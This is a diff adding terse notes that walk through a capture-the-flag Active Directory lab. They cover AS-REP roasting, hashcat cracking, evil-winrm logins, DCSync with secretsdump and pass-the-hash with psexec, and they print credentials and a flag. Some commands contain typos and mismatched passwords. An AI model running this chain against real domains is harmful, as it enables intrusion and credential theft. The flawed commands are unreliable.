@@ -1,0 +1,92 @@
+sauna active directory machine walkthorugh 
+
+skills learned : - 
+ASREPRoasting Attack
+DCSync Attack 
+
+
+Enumeration : - 
+nmap : - 
+
+ports=$(nmap -p- --min-rate=1000 -T4 10.129.95.180 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) nmap -p$ports -sC -sV 10.129.95.180
+
+al lots of ports open like : - 
+53,80,88,135,139,389,445,464,593,636,3268,3269,5985
+
+
+enumeration all ports : - 
+ldap enumeraiton : - 
+
+./windapsearch -d egotistical-bank.local -dc-ip 10.129.95.180 -u 
+
+impacket-GetADUsers egotistical-bank.local/ -dc-ip 10.129.95.180 -dubug
+
+smbclient -L \\\\10.129.95.180 -N 
+no share found ! 
+
+ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.129.95.180/FUZZ
+
+ on navigating to about.html and scrolling down, we see a section containing full names of some bank employees. 
+
+foothold : - -----------------------------------------
+
+./username-anarchy --input-file fullnames.txt --select-format first,first,first.last,firstl > unames.txt
+
+cat unames.txt 
+fergus
+fergus.smith
+ferguss
+fsmith
+shaun
+shaun.coins
+scoins
+
+
+while read p; do impacket-GetNPUsers egotistical-bank.local/"$p" -request -no-pass -dc-ip 10.129.95.180 >> hash.txt; done <unames.txt 
+
+after capture fsmith hash now crack the password : - 
+
+hashcat --help | grep kerberos 
+hashcat -m 18200 hash.txt -o pass.txt /usr/share/wordlists/rockyou.txt --force
+
+now username : - fsmith
+password is : - Thestrokes23
+
+evil-winrm -i 10129.95.180 -u fsmith -p Thestrokes23
+
+privilege escalation : - 
+upload winpeas.exe  and execute it . 
+now you will see svc_loanmgr password :) 
+
+[+] Looking for AutoLogon credentials
+    Some AutoLogon credentials were found!!
+    DefaultDomainName             :  EGOTISTICALBANK
+    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
+    DefaultPassword               :  Moneymakestheworldgoround!
+
+
+evil-winrm -i 10129.95.180 -u svc_loanmgr -p 'Monkeymakestheworldgoround!'
+
+now enumerate with bloodhound 
+
+install bloodhound : - 
+sudo apt install bloodhound
+sudo pip install  bloodhound-python 
+bloodhound-python -u svc_loanmgr -p Monkeymakestheworldgoround! -d egotistical-bank.local -ns 10.129.95.180 -c All 
+
+after complete enumeration bloodhound files now compress the files into a zip and upload it 
+
+zip info.zip *.json
+
+neo4j console 
+bloodhound 
+
+now upload zip file to enumerate domain users
+
+impakcet-secretsdump egotistical-bank.local/svc_loanmgr@10.129.95.180 -just-dc-user Administrator
+
+now crack the password : - 
+impakcet-psexec egotistical-bank.local/administrator@10.129.95.180 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
+
+type root.txt 
+e2b40451277d5c96d3186dc99dd8d92f
